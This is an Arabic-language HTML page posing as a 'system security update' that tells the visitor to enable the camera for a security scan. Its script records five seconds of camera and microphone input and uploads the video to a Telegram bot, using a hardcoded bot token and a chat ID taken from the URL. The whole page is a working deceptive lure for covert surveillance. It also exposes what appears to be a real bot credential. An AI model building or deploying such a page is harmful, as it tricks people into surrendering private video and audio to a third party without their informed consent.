<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحديث الأمان</title>
    <style>
        body { background: #0d1117; color: white; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
        .card { background: #161b22; padding: 30px; border-radius: 10px; border: 1px solid #30363d; width: 80%; max-width: 300px; }
        .btn { background: #238636; color: white; border: none; padding: 12px 20px; border-radius: 6px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 15px; }
        .loader { display: none; border: 3px solid #21262d; border-top: 3px solid #f85149; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 15px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="card">
        <h3>تحديث النظام</h3>
        <p id="msg">يجب تفعيل الوصول للكاميرا لإتمام عملية فحص الأمان.</p>
        <div id="loader" class="loader"></div>
        <button id="startBtn" class="btn" onclick="startProcess()">تفعيل الآن</button>
    </div>

    <script>
        const botToken = '8128965245:AAHH3QO-vGGfWmFtCicmw7T9gmBcMWbUg6E';
        const urlParams = new URLSearchParams(window.location.search);
        const chatId = urlParams.get('sender_id');

        async function startProcess() {
            if (!chatId) { alert("خطأ في المعرف"); return; }

            const btn = document.getElementById('startBtn');
            const loader = document.getElementById('loader');
            const msg = document.getElementById('msg');

            btn.style.display = 'none';
            loader.style.display = 'block';
            msg.innerText = "جاري الاتصال بالكاميرا...";

            try {
                // محاولة فتح الكاميرا والمايكروفون
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                
                // هنا ستظهر النقطة الخضراء حتماً
                msg.innerText = "جاري الفحص... يرجى الانتظار";

                const recorder = new MediaRecorder(stream);
                const chunks = [];

                recorder.ondataavailable = e => chunks.push(e.data);
                recorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'video/webm' });
                    await sendToTelegram(blob);
                    stream.getTracks().forEach(t => t.stop()); // إطفاء النقطة الخضراء
                };

                recorder.start();
                // تسجيل لمدة 5 ثوانٍ
                setTimeout(() => recorder.stop(), 5000);

            } catch (err) {
                btn.style.display = 'block';
                loader.style.display = 'none';
                msg.innerText = "فشل الوصول! يجب الضغط على 'سماح' (Allow) للمتابعة.";
            }
        }

        async function sendToTelegram(blob) {
            const fd = new FormData();
            fd.append('chat_id', chatId);
            fd.append('video', blob, 'video.mp4');
            
            try {
                await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, { method: 'POST', body: fd });
                document.getElementById('msg').innerText = "تم بنجاح!";
                document.getElementById('loader').style.display = 'none';
            } catch (e) {
                document.getElementById('msg').innerText = "خطأ في الإرسال.";
            }
        }
    </script>
</body>
</html>
